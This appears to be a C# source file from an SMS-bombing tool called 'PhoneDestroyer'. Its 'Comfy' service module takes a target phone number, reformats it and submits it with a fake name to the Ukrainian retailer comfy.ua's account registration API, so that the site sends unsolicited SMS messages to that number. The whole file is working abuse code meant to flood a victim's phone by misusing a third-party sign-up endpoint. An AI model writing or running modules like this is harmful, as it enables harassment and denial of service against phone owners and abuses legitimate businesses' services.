using PhoneDestroyer.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace PhoneDestroyer.Services
{
    public class Comfy : Service
    {
        public override string Name => "Comfy";
        public override CountryCodes AvailableFor => CountryCodes.UA;

        public override async Task<bool> SendSmsAsync()
        {
            var phone = "+38(0" + PhoneNumber.Substring(0, 2) + ")" + "-" + PhoneNumber.Substring(2, 3) +
                "-" + PhoneNumber.Substring(5, 2) + "-" + PhoneNumber.Substring(7, 2);
            var resp = await Client.PostAsync(
                "https://comfy.ua/api/auth/register",
               new FormUrlEncodedContent(new List<KeyValuePair<string, string>>()
               {
                    KeyValuePair.Create("registration_phone", phone),
                    KeyValuePair.Create("registration_email", ""),
                    KeyValuePair.Create("registration_name", "Роман"),
               }));
            if (LogDebug)
            {
                var content = await resp.Content.ReadAsStringAsync();
                Logger.LogDebug("REGISTER\n" + content);
            }

            return resp.IsSuccessStatusCode;
        }
    }
}
